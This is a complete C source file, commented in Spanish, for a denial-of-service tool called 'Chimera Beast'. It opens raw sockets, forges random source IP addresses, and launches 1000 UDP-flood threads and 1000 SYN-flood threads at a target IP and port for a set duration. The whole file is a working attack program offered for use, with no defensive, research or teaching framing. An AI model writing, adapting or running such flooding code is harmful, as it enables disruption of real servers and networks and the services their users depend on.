// chimera_beast.c - El músculo de bajo nivel para floods de red brutales
// Compilar con: gcc -O3 -pthread chimera_beast.c -o chimera_beast

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h> // Cabecera crucial para struct tcphdr
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 1472 // Tamaño máximo de payload UDP

// Estructura para pasar argumentos a los hilos
typedef struct {
    char *target_ip;
    int target_port;
    int duration;
} attack_args;

// Cabecera pseudo para el checksum
struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t udp_length;
};

// Función de checksum (estándar en C para redes)
unsigned short csum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;

    return answer;
}

// Hilo de ataque UDP Flood puro y rápido
void *udp_flood_thread(void *args) {
    attack_args *a = (attack_args *)args;
    struct sockaddr_in sin;
    int sd;
    char buffer[MAX_PACKET_SIZE];
    struct iphdr *ip = (struct iphdr *)buffer;
    struct udphdr *udp = (struct udphdr *)(buffer + sizeof(struct iphdr));
    struct pseudo_header pheader;

    time_t start_time = time(NULL);

    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sd < 0) {
        perror("socket() error");
        pthread_exit(NULL);
    }

    sin.sin_family = AF_INET;
    sin.sin_port = htons(a->target_port);
    sin.sin_addr.s_addr = inet_addr(a->target_ip);

    memset(buffer, 0, MAX_PACKET_SIZE);

    // Llenar cabecera IP
    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + (MAX_PACKET_SIZE - sizeof(struct iphdr) - sizeof(struct udphdr)));
    ip->id = htonl(54321);
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_UDP;
    ip->saddr = random(); // IP fuente aleatoria
    ip->daddr = sin.sin_addr.s_addr;

    // Llenar cabecera UDP
    udp->source = htons(random() % 65535);
    udp->dest = htons(a->target_port);
    udp->len = htons(sizeof(struct udphdr) + (MAX_PACKET_SIZE - sizeof(struct iphdr) - sizeof(struct udphdr)));

    // Llenar payload con datos aleatorios
    char *payload = buffer + sizeof(struct iphdr) + sizeof(struct udphdr);
    int payload_size = MAX_PACKET_SIZE - sizeof(struct iphdr) - sizeof(struct udphdr);
    for (int i = 0; i < payload_size; ++i) {
        payload[i] = random() % 255;
    }

    // Bucle de envío brutal
    while (time(NULL) - start_time < a->duration) {
        ip->saddr = random(); // Cambiar IP fuente en cada paquete
        ip->id = random();
        ip->check = 0; // Resetear checksum antes de recalcular
        ip->check = csum((unsigned short *)buffer, sizeof(struct iphdr));

        udp->source = htons(random() % 65535);
        udp->check = 0; // Resetear checksum antes de recalcular
        
        // Calcular checksum UDP
        pheader.source_address = ip->saddr;
        pheader.dest_address = ip->daddr;
        pheader.placeholder = 0;
        pheader.protocol = IPPROTO_UDP;
        pheader.udp_length = udp->len;

        char udp_checksum_data[sizeof(struct pseudo_header) + sizeof(struct udphdr) + payload_size];
        memcpy(udp_checksum_data, &pheader, sizeof(struct pseudo_header));
        memcpy(udp_checksum_data + sizeof(struct pseudo_header), udp, sizeof(struct udphdr));
        memcpy(udp_checksum_data + sizeof(struct pseudo_header) + sizeof(struct udphdr), payload, payload_size);
        udp->check = csum((unsigned short *)udp_checksum_data, sizeof(udp_checksum_data));
        
        if (sendto(sd, buffer, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            // No imprimir errores para no ralentizar el hilo
        }
    }
    
    close(sd);
    pthread_exit(NULL);
}

// Hilo de ataque SYN Flood
void *syn_flood_thread(void *args) {
    attack_args *a = (attack_args *)args;
    struct sockaddr_in sin;
    int sd;
    char buffer[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    struct iphdr *ip = (struct iphdr *)buffer;
    struct tcphdr *tcp = (struct tcphdr *)(buffer + sizeof(struct iphdr));

    time_t start_time = time(NULL);

    sd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sd < 0) {
        perror("socket() error");
        pthread_exit(NULL);
    }

    sin.sin_family = AF_INET;
    sin.sin_port = htons(a->target_port);
    sin.sin_addr.s_addr = inet_addr(a->target_ip);

    memset(buffer, 0, sizeof(buffer));

    // Llenar cabecera IP
    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(buffer));
    ip->id = htonl(54321);
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_TCP;
    ip->saddr = random();
    ip->daddr = sin.sin_addr.s_addr;

    // Llenar cabecera TCP
    tcp->source = htons(random() % 65535);
    tcp->dest = htons(a->target_port);
    tcp->seq = htonl(random());
    tcp->ack_seq = 0;
    tcp->doff = 5;
    tcp->syn = 1; // Flag SYN activado
    tcp->window = htons(65535);
    tcp->check = 0;
    tcp->urg_ptr = 0;

    // Bucle de envío
    while (time(NULL) - start_time < a->duration) {
        ip->saddr = random();
        ip->id = random();
        ip->check = 0; // Resetear checksum
        ip->check = csum((unsigned short *)buffer, sizeof(struct iphdr));

        tcp->seq = htonl(random());
        tcp->source = htons(random() % 65535);
        tcp->check = 0; // Resetear checksum
        
        // Calcular checksum TCP
        struct pseudo_header pheader_tcp;
        pheader_tcp.source_address = ip->saddr;
        pheader_tcp.dest_address = ip->daddr;
        pheader_tcp.placeholder = 0;
        pheader_tcp.protocol = IPPROTO_TCP;
        pheader_tcp.udp_length = htons(sizeof(struct tcphdr));
        
        char tcp_checksum_data[sizeof(struct pseudo_header) + sizeof(struct tcphdr)];
        memcpy(tcp_checksum_data, &pheader_tcp, sizeof(struct pseudo_header));
        memcpy(tcp_checksum_data + sizeof(struct pseudo_header), tcp, sizeof(struct tcphdr));
        tcp->check = csum((unsigned short *)tcp_checksum_data, sizeof(tcp_checksum_data));
        
        if (sendto(sd, buffer, sizeof(buffer), 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            // No imprimir errores para no ralentizar el hilo
        }
    }
    
    close(sd);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Uso: %s <IP> <PUERTO> <DURACION_SEGUNDOS>\n", argv[0]);
        exit(1);
    }
char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int num_threads = 1000; // Número de hilos para cada tipo de ataque

    pthread_t udp_threads[num_threads];
    pthread_t syn_threads[num_threads];
    attack_args args = {target_ip, target_port, duration};

    printf("[CHIMERA BEAST] Iniciando ataque de bajo nivel en %s:%d por %d segundos\n", target_ip, target_port, duration);
    printf("[CHIMERA BEAST] Desplegando %d hilos de UDP Flood y %d hilos de SYN Flood...\n", num_threads, num_threads);

    // Crear hilos de UDP Flood
    for (int i = 0; i < num_threads; ++i) {
        pthread_create(&udp_threads[i], NULL, udp_flood_thread, &args);
    }

    // Crear hilos de SYN Flood
    for (int i = 0; i < num_threads; ++i) {
        pthread_create(&syn_threads[i], NULL, syn_flood_thread, &args);
    }

    // Esperar a que todos los hilos terminen
    for (int i = 0; i < num_threads; ++i) {
        pthread_join(udp_threads[i], NULL);
        pthread_join(syn_threads[i], NULL);
    }

    printf("[CHIMERA BEAST] Ataque de bajo nivel finalizado.\n");
    return 0;
}
